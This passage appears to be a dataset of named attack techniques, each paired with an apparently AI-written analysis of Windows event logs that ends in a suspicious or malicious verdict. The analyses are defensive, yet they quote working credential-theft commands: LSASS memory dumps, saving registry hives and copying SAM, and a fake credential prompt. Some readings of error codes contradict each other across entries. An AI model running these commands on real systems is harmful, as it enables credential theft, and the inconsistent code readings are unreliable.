   - A repetitive pattern of processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe` are executed with the user `SERVER002\admin_test`.
   - The frequent usage of `wevtutil.exe` and `conhost.exe` may be indicative of attempts to query or clear event logs or execute tasks in a manner that reduces visibility. However, it is not uncommon for these processes to appear in logs during administrative operations.
   - The execution of `powershell.exe` with a particular focus on the command `rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM` stands out. The use of `rpcping.exe`, especially when not expected, can be indicative of testing or probing of remote procedure call (RPC) communications and potentially used for network discovery or probing activities.

2. **PowerShell Logs:**
   - The logs support the presence of a PowerShell execution block running the same `rpcping` command. While PowerShell is often used for administrative tasks, the command executed could indicate malicious intent, especially if not a part of regular administrative operations or scripts.
   - The focus on `rpcping` and NTLM authentication within the command could be indicative of lateral movement attempts or reconnaissance.

3. **Security Logs:**
   - Multiple entries of Event ID 5379 are noted, indicating credential validation requests. The attempts are failing with code `3221226021`, implying an invalid handle error, which is usually logged when an operation attempts to access a resource with invalid permissions or credentials.
   - The combination of failed credential operations and the use of `rpcping` suggests potential unauthorized exploration or probing of network services, possibly attempting to discover valid credentials or resources.

**Assessment:**
- The current behaviors in the logs, including the use of `rpcping`, frequent PowerShell use without clear administrative purpose, and multiple credential errors, suggest activities that could easily be classified as probing or reconnaissance.
- Given the logs indicate a potentially suspicious sequence of operations focusing on internal network interactions, more investigation is necessary to determine the intent, origin, and scope of this activity.

**Resolution: SUSPICIOUS**
- Further investigation is needed to determine if these actions are part of legitimate administrative tasks.
- Review whether the tools and commands used align with standard operating procedures for `SERVER002\admin_test`.
- Check whether similar patterns occur on other systems within the network, indicating a broader issue.
- Consider increasing logging or deploying additional monitoring to capture more information on similar activities going forward."
Create Volume Shadow Copy remotely with WMI,"### Analysis of Event Logs

**Winlog Event Analysis:**

**Security Logs:**

- **Events 4904 and 4905:** These events pertain to the Volume Shadow Copy Service (VSS) operations, which are quite common and often benign. The operations involve creating or deleting shadow copies(storage snapshots) of volumes for backup purposes. The events log the operation of `VSSVC.exe`, which is the legitimate Windows service responsible for these tasks.

- **Events 5379:** These events are related to credential validation or access operations. In this instance, processes are attempting to read credentials from services like MicrosoftAccount and WindowsLive, each resulting in a `ReturnCode` of `3221226021`, which translates to ""Access is denied."" These failures might suggest attempts to access secured resources, but they don't provide conclusive evidence of malicious intent.

**Sysmon Logs:**

- **Sysmon Events:**
  - Multiple processes involving execution of `Cmd.exe`, `conhost.exe`, `wmic.exe`, and `wevtutil.exe`, predominantly executed by the `admin_test` user.
  - Notably, there are commands involving volume shadow copy tasks with `wmic shadowcopy list brief` and creation commands, which could suggest potential exploration or malicious activities involving shadow copies.
  - Execution of utilities such as `HOSTNAME.EXE`, `whoami.exe`, `taskhostw.exe`, and `wuauclt.exe`, which can be indicative of enumeration steps often performed by malware or during penetration testing.
  - `MicrosoftEdgeUpdate.exe`, `MpSigStub.exe`, and related services indicate ongoing updates, which is part of legitimate system maintenance tasks.

**Application Logs:**

- **Application Event 15:** Indicates Windows Defender is operational, which suggests active protection on the system.

**System Logs:**

- **WindowsUpdateClient Events:** These detail the execution and installation of updates, denoting normal patch management activities.

### Assessment

- **Unusual Activity:** The consistent execution of `wmic` commands related to shadow copy operations by the `admin_test` user is noteworthy. In malicious contexts, attackers often interact with shadow copies to extract information or prepare for data manipulation or exfiltration.
  
- **Enumeration Commands:** Logs showing the use of `whoami.exe` and `HOSTNAME.EXE`, as well as use of `taskhostw.exe`, while legitimate in some contexts, may suggest exploratory behavior if unauthorized.

### Conclusion

Given the combination of system enumeration, credential access attempts, and volume shadow copy manipulations, these logs indeed show patterns that deviate from a typical benign user's activity, especially surrounding the `admin_test` user. While no overt malicious payload or confirmed compromise is present, the actions are suspicious and warrant deeper investigation to confirm legitimacy.

### Resolution

**Resolution: SUSPICIOUS**

**Further Actions Recommended:**

1. **Credential Hygiene Review:** Verify whether the `admin_test` account has the necessary privileges and ensure that these activities align with legitimate administrative tasks.
  
2. **Audit Shadow Copy Operations:** Review further logs and configurations to ensure that these operations are authorized and benign.

3. **Anomaly Correlation:** Cross-reference against other security tools and logs (e.g., EDR/AV logs) to confirm whether typical attack patterns match these events.

4. **Network Monitoring:** Check for any related external communications that may indicate data exfiltration or unauthorized remote access.

5. **Endpoint Integrity:** Ensure the endpoint is scanned with updated anti-malware tools to detect any dormant or active threats."
Dump LSASS.exe Memory through Silent Process Exit,"Upon reviewing the provided event logs from the Windows host, several points of concern emerge. Here is a detailed analysis of suspicious or potentially malicious activities observed:

1. **Application Log - Event ID 1109**: The entry associated with `nanodump.x64.exe` located in the user's temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\nanodump.x64.exe`) indicates the file was executed. The filename ""nanodump"" is commonly associated with tools used for credential dumping, implying potentially malicious activity aimed at extracting sensitive information such as Windows credentials.

2. **Sysmon Log - Event ID 1 & 5**: The logs show multiple instances of command-line activity and process executions linked to `nanodump.x64.exe`. A notable command-line execution involves using `cmd.exe` to run `nanodump.x64.exe` in silent mode. The silent mode execution indicates an attempt to evade detection by not displaying a window or requiring user interaction.

3. **Sysmon Log - Common Processes**:
   - Execution of `wevtutil.exe`: There are several instances of `wevtutil.exe` executions. While `wevtutil` is a legitimate tool used for managing Windows Event Logs, its usage in quick succession and alongside potential malicious processes raises suspicions. Manipulation of event logs is a known tactic for covering tracks after malicious activities.
   - Execution of `powershell.exe`: Execution of PowerShell could indicate scripting activity, potentially used for further automation or exploitation tasks.

4. **Unexpected Elevation Activity**: The processes are executed under the `SERVER002\\admin_test` account, potentially indicating a compromised account with elevated privileges, matching known patterns where attackers gain unauthorized access and elevate privileges to perform malicious activities unimpeded.

### Assessment and Recommendation:

- **Assessment**: The presence of `nanodump.x64.exe` combined with the observed command-line executions and event log accesses suggests activities consistent with credential dumping and potentially covering tracks. These are strong indicators of malicious activity taking place on the host.

- **Threats and Risks Identified**: The risks include exposure or theft of sensitive credentials, potential lateral movement within the network, execution of unauthorized code, and tampering with event logs to hide traces of attacks. These could lead to lasting impacts, including data breaches and disruption of operations.

- **Resolution**: MALICIOUS - There is enough evidence to deduce that the activities documented in the logs are malicious.

### Guidance to Proceed:

1. **Immediate Containment**: Isolate the affected machine from the network to prevent further spread or execution of malicious activities.
2. **Forensic Investigation**: Perform a detailed forensic analysis of the affected host to identify further indicators of compromise, including examining memory, disk, and network traffic.

Dump LSASS.exe Memory using Out-Minidump.ps1,"Based on the logs provided, I noted the following analysis points:

1. **WMI Provider Host and Elevated Privileges**:
   - The event log captures execution of the WMI Provider Host (`WmiPrvSE.exe`) under the SYSTEM account. This behavior is typical and by itself not suspicious.

2. **Execution of `wevtutil.exe` and `conhost.exe` by Test Admin**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\admin_test`. The `wevtutil.exe` (Windows Event Utility) can be used to query or manage event logs. Frequent execution in a short period could indicate a script or automated process interaction. Due to the user context, it suggests activity that might align with log manipulation or querying.

3. **Use of PowerShell with Suspicious Script**:
   - A PowerShell instance executes a script that attempts actions related to potentially malicious intent:
     - Setting Security Protocol to `Tls12` suggests an attempt to ensure secure web communications.
     - Creating directories within `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp""` implies creation/usage of a temporary environment.
     - Executing inline code that utilizes `IEX` and `IWR` to pull and potentially execute a script from a GitHub URL: 
       - This script (`Out-Minidump.ps1`) attempts to interact with the `lsass` process. Often, this is associated with malicious attempts to extract credentials.
     - The script’s catch block suggests it attempts error handling gracefully or provides feedback via the exit code.

4. **Tool Execution `hostname.exe` and `whoami.exe`**:
   - Executions of `hostname.exe` and `whoami.exe` are usually benign. However, contextually around the PowerShell activity, they might be used to verify the operating environment and current user context, respectively, as part of reconnaissance activities.

Overall Assessment and Recommendation:
- **MALICIOUS**: The logs indicate highly suspicious PowerShell activity likely intended to extract sensitive information (LSASS dumping), common in credential harvesting campaigns. The behavior suggests a potential compromise needing immediate containment actions.

Next Steps:
1. **Contain and Eradicate**:
   - Immediately investigate and isolate the server `SERVER002` to prevent further propagation.
   - Review and respond to any other incidents associated with the user `admin_test`.

2. **Perform Digital Forensics**:
   - Forensically capture system memory and disk for detailed analysis, focusing on PowerShell execution context and retrieved scripts. 
   - Investigate any lateral movement and further compromise.

3. **Implement Monitoring and Defense**:
   - Initiate enhanced logging, including PowerShell script block logging and command line auditing.

ADFS token signing and encryption certificates theft - Local,"### Analysis:

#### PowerShell Logs:
1. **EventID 600**: Indicates the start of a PowerShell activity.
   - **Suspicious Module and Commands**:
     - `Import-Module AADInternals -Force`: This module is often used for internal administrative tasks related to Azure Active Directory, but it can also be used for extracting sensitive information.
     - `Export-AADIntADFSCertificates`: This command exports ADFS certificates. Unauthorized access or export of such certificates can facilitate further exploitation or unauthorized access.
     - These actions were executed with admin_test privileges on a critical server (Server002).

#### Sysmon Logs:
1. **Process Execution**:
   - **Powershell.exe Execution**: The suspicious command above was executed by `powershell.exe`, indicating scripted activity.
   - **Administrator User (admin_test)**: Powershell and other system utilities were being run by an administrative account (`SERVER002\\admin_test`), which increases the risk if this account is compromised.
2. **Utilities Executed**:
   - Execution of `whoami.exe`, `hostname.exe`, `conhost.exe`, and `svchost.exe` could be part of reconnaissance or admin tasks, but in this context, where ADFS certificates are being exported, it raises suspicions.
3. **EdgeUpdate.exe Activity**:
   - Executions related to `Microsoft Edge Installer` and subsequent setups are present, but not directly related unless used to disguise or execute malicious payloads.

### Assessment:
The combination of loading the AADInternals module, especially when misused for unauthorized data export like ADFS certificates, and the execution of these in a script, strongly suggests an Attempted Compromise. Other benign activities like Edge updates are more standard but unrelated in this context.

### Resolution: **MALICIOUS**

Given the context where potentially sensitive operations are being executed under administrative privileges without clear explanation or known administrative tasks, this activity should be treated as malicious. Immediate steps should be:

1. **Containment**: Restrict account `admin_test` and any other affected systems' access.

Password Spray Invoke-DomainPasswordSpray Light,"**Detailed Analysis:**

From the provided logs, here are the points of interest that indicate suspicious or potentially malicious activity:

1. **PowerShell Command Execution:**
   - The event logs show multiple instances of PowerShell execution which is not uncommon for Windows systems. However, the specific use of `PowerShell` script indicates an attempt to run a function named `Invoke-dpsLight`. This script seems to iterate through a list of users and attempts to authenticate using a password (`Spring2020`). This activity resembles a password spraying attack which is a known malicious technique used to gain unauthorized access to accounts by attempting a set of passwords against a list of accounts.

2. **Unusual Process Executions:**
   - There are legitimate processes running such as `conhost.exe`, `sppsvc.exe` (Software Protection Platform Service), and `wevtutil.exe`, but their associations with PowerShell in the logs, specifically with the suspicious script mentioned, and the involved user context (SERVER002\\admin_test), are notable. Many legitimate administrative activities could trigger similar entries, but the context and observed pattern are suspicious.

3. **Integrity of PowerShell Execution:**
   - The PowerShell execution operates at a high integrity level, meaning it has elevated privileges. This is typical for administrative tasks but combined with the use of a potentially intrusive script, it raises red flags.

### System and Security Logs

1. **Time Change Events (EventID 24, 1, 35, 4616)**: 
   - The logs show multiple time change events within the same second, performed by the svchost.exe process under the NT AUTHORITY\LOCAL SERVICE context.
   - The changes move the time forward minimally, which might be unrelated to malicious actions. Such time adjustments can occur legitimately but should be noted in context with other events.

### Windows PowerShell Logs

1. **PowerShell Execution (EventID 600, 400, 403)**:
   - There is a PowerShell script execution attempting to download and execute a script from GitHub: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`.
   - The script involves functionality like `lazagnemodule`, which is recognized as an enumeration tool used for credential stealing and privilege escalation testing.
   - This indicates clearly unauthorized and potentially harmful activity indicative of a compromise.

### Sysmon Logs

1. **Process Creation Events (EventID 1, 5)**:
   - Several processes relating to system utilities `hostname.exe`, `whoami.exe`, show standard operations.
   - However, **a specific PowerShell process (ProcessId 4016)** with a command line directly matching the PowerShell entry loading the `WinPwn.ps1` script is corroborative of malicious intent.
   - Edge update components appear frequently, these are typically benign during update check cycles, no immediately suspicious modifications noted in these logs.

### Application Log

- The logs primarily contain details about stopped services with no directly suspicious activity indicated.
- Notably, Windows Defender was turned on during this timeframe, indicating some level of defense was active.

### Assessment

Given the evidence, especially the PowerShell logs and corresponding Sysmon records indicating unauthorized script execution aiming at reconnaissance or potential system exploitation, it's clear we are observing malicious activity.

PowerShell - Prompt User for Password,"Upon analyzing the provided logs, the following details stand out:

- **PowerShell Activity:**
  - Several PowerShell commands were executed which appear to be involved in extracting information and prompting for user credentials. Notably, the command line used was: `""powershell.exe"" & {# Creates GUI to prompt for password. Expect long pause before prompt is available. $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserDomainName), write-warning $cred.GetNetworkCredential().Password}`. This script is designed to create a GUI credential prompt, indicating that a user was likely targeted for phishing their credentials. PowerShell is sometimes used in attacks due to its powerful scripting capabilities and ease of evasion.
  
- **Process Execution Insight:**
  - The frequent execution of `whoami.exe` and `hostname.exe` could indicate an attempt to gather information about the logged-in user and system environment, typical reconnaissance activity that precedes an attack.
  - There was an unusual execution of `windowspowershell.exe` with commands designed to extract network credentials as highlighted above.
  
- **Security Auditing:**
  - Multiple failed credential access attempts were noted, raising suspicion about unauthorized attempts to access secure credentials.
  - Privilege escalations were observed where user `admin_test` had extensive privileges, including backup, restore, and debug privileges, indicating the user account could be used to perform high-level operations, potentially without detection if misused.

- **Other Process Activities:**
  - Routine operating system processes like `conhost.exe`, and legitimate software update processes for Microsoft Edge were also on the logs, which appear to show typical systems maintenance activity.

Taking into account the nature of the PowerShell script prompting for credentials and the context of activities like information gathering through command execution of `whoami` and `hostname`, as well as the user with elevated privileges, there's evidence to suggest the possibility of an attempted credential theft or reconnaissance by malicious actors.

### Assessment:
Based on the suspicious PowerShell activity, the reconnaissance pattern, and the guidance from typical cyber forensics, the behavior observed in these logs could potentially indicate a **MALICIOUS** incident, particularly due to the unauthorized credential prompt and associated suspicious command execution.

These actions can help in auditing the full extent of the compromise if any indeed happened, and reinforce defenses against similar threats in the future."
List Credential Files via Command Prompt,"**Analysis of Event Logs:**

1. **Application Log:**
   - The application log shows entries related to the ""edgeupdate"" service being stopped, as seen in event records 2385 and 2386. Stopping and starting services, particularly legitimate software update services like ""edgeupdate,"" can be routine. Without further context, these activities don't specifically indicate malicious behavior.

2. **Security Log:**
   - The security log contains entries for Event ID 4616, which signifies changes in system time. The logs show that the `TimeChange` event is carried out by `LOCAL SERVICE`, and the time change seems to be a mere adjustment within one second. Time changes can sometimes be indicative of attempts to mess with log timestamps, but in this case, the changes appear to be benign as they occur in a very short span.

3. **Sysmon Log:**
   - The Sysmon log contains various entries for process creation (Event ID 1) and process termination (Event ID 5). Notable entries include executions of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`.
   - The execution of `cmd.exe` with command-line arguments that access hidden directories in `C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials` and `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials` is suspicious (Event Record ID 17977). This could indicate an attempt to access sensitive credential information, which is often seen in malicious behavior.
   - There are multiple similar process executions involving Microsoft Edge Update (""MicrosoftEdgeUpdate.exe""), which could be benign updates or installations. However, the frequent starting and stopping of update processes across several entries could warrant further inspection to rule out potential misuse or tampering.

4. **System Log:**
   - Contains time synchronization with `time.windows.com` and adjustments by `svchost.exe`. These events are standard practice for maintaining system time accuracy.

- **SUSPICIOUS:** While much of the activity could be benign or routine, the specific command-line usage observed in the Sysmon logs merits further investigation to determine its legitimacy and necessity. It is essential to audit such behavior, check for any unauthorized access attempts, and ensure system integrity. Further validation and context surrounding these events should be pursued to eliminate the potential risk."
dump volume shadow copy hives with System.IO.File,"### Detailed Analysis:

Upon examining the provided Windows event logs across multiple logs types (PowerShell, System, Security, Sysmon, and Application), the following observations have been made:

#### Indicators of Malicious Activity:
1. **PowerShell Logs:**
   - There is a set of PowerShell activity entries where a script attempts to copy files from `HarddiskVolumeShadowCopy` to a temporary directory: 
     ```powershell
     powershell.exe & {1..10 | % { 
     try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"" , ""$env:TEMP\SAMvss$_"", ""true"") } catch {}
     ls ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore
     }}
     ```
   - This activity is highly suspicious as it attempts to access the Security Account Manager (SAM) database, which contains password hashes for local accounts. Such actions are often an indication of lateral movement or credential dumping attempts by malicious actors.

2. **Security Logs:**
   - There are several privileged tasks initiated by the user `admin_test`, specifically:
     - Event ID 4672 shows multiple high-privilege tokens being enabled (SeDebugPrivilege, SeBackupPrivilege, etc.), which are not typically used during regular operations.

3. **Sysmon Logs:**
   - There are numerous `Sysmon` events indicating the execution of critical Windows processes, some of which involve `powershell.exe` executing commands that align with those detected in the PowerShell logs.
   - Entries indicate the execution of various system utilities and updates (`wevtutil.exe`, `conhost.exe`, `whoami.exe`) under the `admin_test` user, indicating administrative level access.

4. **System and Windows Update Client Logs:**
   - Normal time service adjustments and security updates for Microsoft Defender Antivirus occurred, indicating regular maintenance activities. These do not inherently imply malicious activity.

  - The PowerShell activity in the logs presents a high risk. The attempt to copy the SAM database secretly is a clear attempt to access and possibly exfiltrate sensitive credential information. Such actions should be considered a critical sign of compromise.

- **Potential Impact:**
  - Compromise of user credentials could lead to unauthorized access to system resources and sensitive data, potentially enabling further intrusion into the network or data breaches.

### Resolution: MALICIOUS
Given the nature of activities observed, particularly with the attempted PowerShell commands that interact with system-level files in a questionable manner, this activity strongly suggests malicious intent. Immediate action is necessary to contain and mitigate potential threats.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - **Isolate the machine (Server002)** from the network to prevent potential spread.
   - **Conduct a thorough forensic investigation** on Server002 to determine the scope and origin of the compromise.
   - **Review all accounts, especially `admin_test`** for unauthorized changes and login activities.
   - **Reset all potentially compromised accounts**, including enforcing updated and complex passwords.
   - **Check for any unauthorized scheduled tasks** or services that might have been installed by the attacker.

2. **Long Term Actions:**
   - Ensure all systems have the latest security updates and patches applied.
   - Implement stricter monitoring of PowerShell script execution using appropriate logging tools.
   - Increase employee training and awareness around phishing and use of administrative privileges.
   - Enhance endpoint security measures, including stronger authentication mechanisms (e.g., Multi-Factor Authentication).

The exploitation attempt detected must be used as an opportunity to enhance security posture across the organization, preventing future attacks."
Dump LSASS.exe using lolbin rdrleakdiag.exe,"### Analysis of Windows Event Logs:

**PowerShell Log Entries:**

The PowerShell logs contain commands executed on the host system `Server002`. The commands executed by PowerShell include an attempt to run a script that checks for the presence of `rdrleakdiag.exe` in `System32` and `SysWOW64` directories. If found, the script creates a minidump of the LSASS process and writes this to a folder in the TEMP directory:

```plaintext
if (Test-Path -Path ""$env:SystemRoot\\System32\\rdrleakdiag.exe"") {
    $binary_path = ""$env:SystemRoot\\System32\\rdrleakdiag.exe""
} elseif (Test-Path -Path ""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe"") {
    $binary_path = ""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe""
} else {
    $binary_path = ""File not found""
    exit 1
}
$lsass_pid = get-process lsass | select -expand id
...
```

**Indicators:**
- Dumping LSASS memory is a common technique used by attackers to extract credentials, indicating potential malicious intent.
- This action suggests credential theft activities and should be investigated immediately.

**Security Logs:**

- Audit logs show a user `admin_test` with `SeDebugPrivilege`, which can be a high risk, allowing manipulation of system-level processes.
- The user `admin_test` has logged on using NTLM authentication from an external machine identified by its `IpAddress`.

**Indicators:**
- Privileges assigned to `admin_test` seem excessive and are typically used by attackers post-compromise.
- Unusual login activity within close proximity to the PowerShell activity indicates coincidental plotting or compromise by the same user account.

**Sysmon Logs:**

- The usage of `wevtutil.exe` and `conhost.exe` multiple times by the user `admin_test`.
- This pair mentions of utilities and processes, especially associated with log file access, can be a sign of evasion or log tampering attempts.
- A process identified with `powershell.exe` confirms the executing user as `SERVER002\admin_test`, reinforcing suspicious activity linked to this user account.

**Indicators:**
- Combined with the PowerShell log entries, the execution of `wevtutil.exe` could suggest an attempt to query or purge security event logs to cover tracks, which is a common tactic by a malicious actor.

### Assessment:

Based on the evidence collated from PowerShell, Security, and Sysmon logs, it appears that there has been a potential compromise on the system `Server002` involving the `admin_test` account. The activities observed, such as making a memory dump of LSASS, suggest potentially malicious activity aimed at credential harvesting, along with suspicious privilege allocations and log manipulation tools.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Response**: Isolate the affected system (Server002) from the network to prevent further unauthorized access or data exfiltration.
2. **Investigation**: Conduct a forensic analysis to understand the extent of the compromise, including any lateral movement or additional affected systems.
3. **Credential Auditing**: Immediately change any credentials that may have been compromised due to access to LSASS dump.
4. **Monitoring**: Implement enhanced monitoring on similar systems and increase auditing verbosity.
5. **Review Privileges**: Re-assess and harden user roles and privileges, especially for accounts with privileges like `SeDebugPrivilege`."
Enumeration for Credentials in Registry,"Based on the provided logs, here's a detailed analysis:

### Analysis:
1. **Sysmon Logs**:
    - There is repeated execution of `conhost.exe` and `wevtutil.exe` by the user `SERVER002\admin_test`. These applications are legitimate Windows executables; however, their frequent and rapid recurring execution could be significant if it does not align with standard administrative tasks.
    - The execution of `wevtutil.exe`, which is used for managing event logs, might be suspicious especially if there is a potential for log alteration or clearing. 
    - The sequence includes commands like `reg.exe` executing with arguments to query Windows Registry for passwords, which is a definite red flag for potential credential harvesting or reconnaissance.
    - Commands running the `cmd.exe` for registry querying (`reg query HKLM /f password /t REG_SZ /s`) directly relate to attempts to search for passwords in the registry and are indicative of unauthorized activity.

2. **Security Logs**:
    - The logs contain several logon entries, particularly `4624` (Successful Logon) and `4672` (Special privileges assigned to new logon), which are standard but they are associated with admin privileges consistently showing elevated tokens.
    - User `admin_test` and SYSTEM level accounts are repeatedly referenced, which suggests elevated actions in a potentially automated or scripted manner.
    - Event ID `4798` presents multiple queries for details on user accounts which could suggest possible reconnaissance activities.

3. **Application Logs**:
    - The log entries are mostly consistent with service stops like `edgeupdate`, which might coincide with regular updates or uninstallation tasks.
    - Noteworthy is the log for Windows Defender being active, although this doesn’t directly indicate malicious activity, it is insightful for the current state of endpoint protection technology.

4. **Behavioral Indicators**:
    - Command-line entries showing registry access and password querying are particularly suspicious.
    - Frequent successes for SYSTEM privileges can be concerning if shown without direct correlation to expected administrator activities.
    - The presence of repeated queries and processes like `whoami.exe`, 'cmd.exe', coupled with their sequence, none of which are associated with normal maintenance could indicate that there may be misuse or intentional exploitation attempts.

### Assessment:
The combination of multiple registry queries for sensitive information, frequent use of specific system tools that could be used for manipulation of system configuration or event logs, and the appearance of elevated permissions or credentials clearly are suspicious in nature.

Conclusion: **SUSPICIOUS**

### Recommended Actions:
- Conduct further in-depth forensic analysis focusing on the user `admin_test` activities.
- Verify the necessity and legitimacy of the sequence of operations for frequent registry queries.
- Examine network logs and behaviors for exfiltration attempts.
- Ensure endpoint protection logs have not been tampered with, and scan for malware countermeasures.
- Review user access policies and commands executed under elevated privileges for non-compliance with security protocols."
Dump LSASS with createdump.exe from .Net v5,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, several patterns and specific behaviors have been noted that warrant further scrutiny:

#### Identified Suspicious Behavior:

1. **Frequent Use of Sysinternals and Built-in Utilities**:
    - **Processes Executed**: Powershell, conhost.exe, wevtutil.exe, hostname.exe, whoami.exe.
    - **PowerShell Execution**: The logs show multiple instances of PowerShell executing with the command `& {$exePath =  resolve-path \""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"", & \""$exePath\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}`.
    - **Potential Memory Dump of LSASS**: The command executed via PowerShell attempts to dump the LSASS process memory to a file (`dotnet-lsass.dmp`), which is a common method used for credential theft by malicious actors.

2. **Wevtutil Usage**:
    - `wevtutil.exe` was run multiple times in quick succession. While it is a legitimate Windows utility for managing event logs, its use is often leveraged by attackers to clear logs or export logs to hide their activities.

3. **Command-line Argument Usage**:
    - The PowerShell command line suggests activity beyond standard administrative tasks, indicative of potential credential harvesting or further exploit preparation.

4. **Repeated Launch of Conhost.exe**:
    - Conhost.exe was repeatedly launched, which is typically normal as it acts as a host for Command Prompt windows. However, its repeated appearances following utility executions may be indicative of scripting or automation.

#### Indicators of Malicious Activity:

- **PowerShell Script**: The execution pattern focusing on LSASS suggests attempts to capture sensitive data.
- **No Legitimate Use Justification**: No administrative or routine Windows maintenance activities justify the usage patterns seen with the tools invoked.

### Assessment:

Given the provided log entries and the patterns observed, there are clear indications of activity consistent with potential malicious intent. The scenarios where memory dumping tools are used to access sensitive process data like LSASS without explicit, legitimate cause align well with methods used in attacks for unauthorized data retrieval, especially for credentials.

### Conclusion:

- **Resolution**: MALICIOUS

### Guidance and Steps Forward:

1. **Immediate Actions**:
   - Isolate the affected host (""Server002"").
   - Investigate the source of execution for the PowerShell and other suspicious processes.
   - Check for unauthorized accounts or activities on the server.

2. **Response and Containment**:
   - Perform a thorough investigation to determine if any successful data exfiltration occurred.
   - If available, restore from a known clean backup.
   - Change all credentials and consider additional monitoring on critical accounts.

3. **Post-Incident Review**:
   - Implement additional security controls, such as restricting access to process memory and PowerShell script logs.
   - Consider deploying enhanced endpoint detection and response (EDR) solutions.

By evaluating these logs, it's critical to act swiftly to prevent any further lateral movement or damage across the network."
PetitPotam,"After analyzing the provided Windows event logs, several key aspects of the entries stand out. Let's identify any suspicious or potentially malicious activities:

1. **Process Execution and Anomalies:**
   - Multiple `conhost.exe` and `wevtutil.exe` processes are seen frequently executing under the `SERVER002\\admin_test` user. While these processes can be legitimate, they can also be used by attackers for various purposes, such as tampering with event logs.

2. **Unusual PowerShell Activity:**
   - The execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with specific command lines is observed in the logs. Notably, an event shows the use of a script stored in a temporary path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\PetitPotam.exe`. This is extremely indicative of suspicious behavior.
   - The PetitPotam executable mentioned in the PowerShell logs is known for exploiting certain Windows vulnerabilities to force authentication requests, potentially leading to privilege escalation attacks. The message ""End of PetitPotam attack"" confirms the execution of this known malicious tool.

3. **Common Legitimate Processes:**
   - Processes such as `svchost.exe`, `SYSTEM`, and various legitimate Microsoft Edge Update processes appear consistently, indicating regular update checks and operations. These actions are typical and expected behavior from Microsoft applications.

4. **Lack of Security Events:**
   - There are no security logs available, which is somewhat unusual. In environments where monitoring integrity is essential, this could be indicative of logs being tampered with or deleted, potentially by the parties involved in malicious activities.

5. **Detected Malware Indicators:**
   - The presence and execution of `PetitPotam.exe` suggest an attempted NTLM relay attack, commonly associated with malicious intent, particularly due to the known vulnerabilities being targeted by this tool.

**Assessment:**
- The activities involving `wevtutil.exe` and frequent PowerShell command executions, especially with PetitPotam, are definite indicators of a potential security breach attempt. The absence of proper Security logs adds to the level of concern.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate action is required to isolate the host to prevent further potential impact. Conduct a thorough examination of compromised systems.
- Ensure logs are secured and not deleted. Bolster monitoring and logging to provide better visibility into such activities in real-time.
- Investigate the source and method of PetitPotam.exe introduction to mitigate further vulnerabilities.
- Conduct a broader network sweep to ensure no other systems are affected and enhance defensive measures against NTLM relay attacks.
- Consult with an incident response team to assess and respond adequately to this breach."
"Registry dump of SAM, creds, and secrets","### Analysis of Windows Event Logs

#### Security Log Analysis
- **Event ID 4624**: This event indicates a successful logon. The logon type 5 suggests a service startup. The fact that the TargetUserName is ""SYSTEM"" and the process initiating the logon is ""C:\Windows\System32\services.exe"" is typical behavior for Windows services and is benign.
- **Event ID 4672**: This indicates special privileges were assigned at logon. The privileges listed, such as ""SeDebugPrivilege"" and ""SeTcbPrivilege"", are typical for SYSTEM logons and not inherently suspicious on their own.

#### Sysmon Log Analysis
- **Process Creation Events (Event ID 1)**:
  - Multiple processes like ""TrustedInstaller.exe"", ""TiWorker.exe"", ""whoami.exe"", ""wevtutil.exe"", and ""conhost.exe"" are shown to run under the SYSTEM or ""admin_test"" user account.
  - Of specific concern is the execution of `cmd.exe` with a command line argument to save registry hives (HKLM\sam, HKLM\system, HKLM\security) to a temporary location, executed by the ""admin_test"" user. This behavior is highly unusual outside of system backups or migrations and could indicate an attempt to extract sensitive information from the registry.

#### Analysis of Command-line Arguments
- The command line for `cmd.exe` contains:
  ```
  ""cmd.exe"" /c reg save HKLM\sam %temp%\sam & reg save HKLM\system %temp%\system & reg save HKLM\security %temp%\security
  ```
  This command is used to save the Security Account Manager (SAM), System, and Security registry hives. This behavior is strongly indicative of credential theft attempts or preparatory steps for privilege escalation. The user executing these commands is ""SERVER002\admin_test"" with a High Integrity Level, which suggests significant capabilities on the system.

#### System Log Analysis
- **Kernel-General Event (Event ID 15)** indicates changes in the hive size, which aligns with the above registry hive save operations, correlating likely changes due to the modifications during those operations.

### Assessment
The activity within these logs, particularly the saving of critical registry hives under a non-standard or inappropriate context, signifies potential unauthorized data access or malicious activity. Such registry access combined with the high integrity level suggests privilege misuse or insider threat behavior.

### Conclusion
The behavior observed, especially the use of administrative commands to save registry hives suspiciously, is highly indicative of malicious activity. This activity represents a potential threat to the system's security, possibly signaling data exfiltration or data access in preparation for further exploitation.

### Resolution
**MALICIOUS** - Immediate investigation is warranted, focusing on the ""admin_test"" account activities and potential isolation of the Server002 to prevent further unauthorized access or data compromise.

### Guidance on How to Proceed
1. **Immediate containment**: Isolate the system from the network to prevent further potential data exfiltration.
2. **Account review**: Investigate and audit the ""admin_test"" account for any unauthorized changes or unusual access patterns.
3. **Memory and disk analysis**: Collect memory snapshots and perform forensic disk analysis to understand further the context and potential impacts.
4. **Credential Reset**: Initiate a credential reset for potentially affected accounts, especially those with high privileges.
5. **Incident Response**: Enact incident response protocols to determine the full scope of potential compromise and any needed remediation or attribution."
